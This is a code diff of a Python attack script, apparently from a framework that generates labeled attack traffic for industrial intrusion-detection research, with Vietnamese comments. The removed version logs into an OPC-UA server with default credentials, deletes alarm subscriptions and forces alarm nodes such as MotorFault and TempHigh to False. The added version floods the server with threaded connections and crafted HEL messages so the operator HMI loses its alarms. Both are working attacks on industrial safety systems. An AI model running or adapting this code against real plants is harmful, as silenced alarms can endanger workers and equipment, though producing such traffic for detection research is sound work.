@@ -1,96 +1,108 @@
 """
 HMI_ALARM_SUPPRESS
-Kỹ thuật: Hủy OPC-UA subscription để HMI không nhận được cảnh báo
-Observable: OPC-UA DeleteSubscriptions request bất thường
+Kỹ thuật: Flood OPC-UA connections để exhaust server resources.
+          Khi server quá tải, HMI thật mất kết nối -> mất alarm.
+Observable: Hàng trăm TCP+HEL connections/s từ IP attacker.
 
 Gọi từ bash:
   python -m attacks_ext.hmi_alarm_suppress \
-      --duration 300 --opc-url opc.tcp://192.168.1.20:4840 \
+      --duration 300 --opc-url opc.tcp://192.168.210.31:4840 \
       --session-id bt_s1 --host-id attacker_host \
       --label-file labels/day7_timeline.csv
 """
 
+import socket
+import struct
 import time
+import threading
 from attacks_ext.config_ext import base_parser, write_label
 
-ALARM_NODES = [
-    "ns=2;s=PLC.Alarms.HighLevel",
-    "ns=2;s=PLC.Alarms.LowPressure",
-    "ns=2;s=PLC.Alarms.MotorFault",
-    "ns=2;s=PLC.Alarms.TempHigh",
-]
+THREADS = 10
+
+
+def build_hello(host, port):
+    endpoint = f"opc.tcp://{host}:{port}".encode()
+    ep_len = len(endpoint)
+    msg_size = 28 + ep_len
+    return (
+        b'HEL' + b'F' +
+        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
+        struct.pack('<I', ep_len) + endpoint
+    )
+
+
+def flood_worker(host, port, hello, results, lock, end_time):
+    while time.time() < end_time:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect((host, port))
+            s.send(hello)
+            time.sleep(0.05)
+            s.close()
+            with lock:
+                results["success"] += 1
+        except Exception:
+            with lock:
+                results["failed"] += 1
 
 
 def run(args):
     label_prefix = "HMI_ALARM_SUPPRESS"
+
+    url = args.opc_url.replace("opc.tcp://", "")
+    parts = url.split(":")
+    host = parts[0]
+    port = int(parts[1]) if len(parts) > 1 else 4840
+
     write_label(args.label_file, label_prefix, "START",
                 args.session_id, args.host_id,
                 episode_id=args.episode_id, day=args.day,
-                note=f"dur={args.duration}s opc={args.opc_url}")
+                note=f"dur={args.duration}s target={host}:{port} threads={THREADS}")
 
-    monitored_items = []
+    results = {"success": 0, "failed": 0}
+    lock = threading.Lock()
+    hello = build_hello(host, port)
+    end_time = time.time() + args.duration
 
     try:
-        from opcua import Client
-        client = Client(args.opc_url)
-        if hasattr(args, "opc_username") and args.opc_username:
-            client.set_user(args.opc_username)
-        if hasattr(args, "opc_password") and args.opc_password:
-            client.set_password(args.opc_password)
-        client.connect()
-        print(f"[+] Đã kết nối OPC-UA")
+        print(f"[*] HMI_ALARM_SUPPRESS -> {host}:{port}")
+        print(f"[*] {THREADS} threads, duration {args.duration}s")
+        print(f"[*] Flood OPC-UA HEL -> resource exhaust -> HMI mat alarm")
 
-        print("[*] Tạo subscription giả lập HMI đang monitor...")
-        sub = client.create_subscription(500, handler=None)
+        threads = []
+        for _ in range(THREADS):
+            t = threading.Thread(target=flood_worker,
+                                 args=(host, port, hello, results, lock, end_time))
+            t.daemon = True
+            threads.append(t)
+            t.start()
 
-        for node_id in ALARM_NODES:
-            node = client.get_node(node_id)
-            try:
-                handle = sub.subscribe_data_change(node)
-                monitored_items.append(handle)
-                print(f"  [SUB] Đang monitor: {node_id}")
-            except Exception as e:
-                print(f"  [WARN] Không thể subscribe {node_id}: {e}")
+        start = time.time()
+        while time.time() < end_time:
+            time.sleep(5)
+            elapsed = int(time.time() - start)
+            print(f"  [{elapsed:3d}s] sent={results['success']} failed={results['failed']}")
 
-        print(f"\n[*] HMI đang nhận {len(monitored_items)} alarm subscription")
-        time.sleep(5)
+        for t in threads:
+            t.join(timeout=3)
 
-        print("\n[!] TẤN CÔNG: Xóa toàn bộ alarm subscription...")
-        sub.delete()
-        print("[!] Đã xóa subscription - HMI mù cảnh báo!")
+        print(f"[*] Done: {results['success']} sent, {results['failed']} failed")
 
-        print("\n[!] Ghi đè giá trị alarm về False...")
-        for node_id in ALARM_NODES:
-            node = client.get_node(node_id)
-            try:
-                node.set_value(False)
-                print(f"  [SUPPRESS] {node_id} <- False")
-            except Exception as e:
-                print(f"  [WARN] {node_id}: {e}")
-
-        suppress_dur = args.duration - 20
-        if suppress_dur > 0:
-            print(f"\n[*] Duy trì trạng thái tắt cảnh báo trong {suppress_dur}s...")
-            time.sleep(suppress_dur)
-
-        client.disconnect()
-
-    except ImportError:
-        print("[ERR] opcua chưa được cài đặt. Cài: pip install opcua")
     except Exception as e:
         print(f"[ERR] {e}")
     finally:
         write_label(args.label_file, label_prefix, "END",
                     args.session_id, args.host_id,
                     episode_id=args.episode_id, day=args.day,
-                    note=f"alarm_subs={len(monitored_items)}")
+                    note=f"sent={results['success']} failed={results['failed']}")
 
 
 def main():
-    p = base_parser("HMI Alarm Suppress Attack")
-    p.add_argument("--opc-url", default="opc.tcp://192.168.1.20:4840")
-    p.add_argument("--opc-username", default="admin")
-    p.add_argument("--opc-password", default="admin123")
+    p = base_parser("HMI Alarm Suppress (OPC-UA Resource Exhaust)")
+    p.add_argument("--opc-url", default="opc.tcp://192.168.210.31:4840")
+    p.add_argument("--opc-username", default="")
+    p.add_argument("--opc-password", default="")
     args = p.parse_args()
     run(args)
 
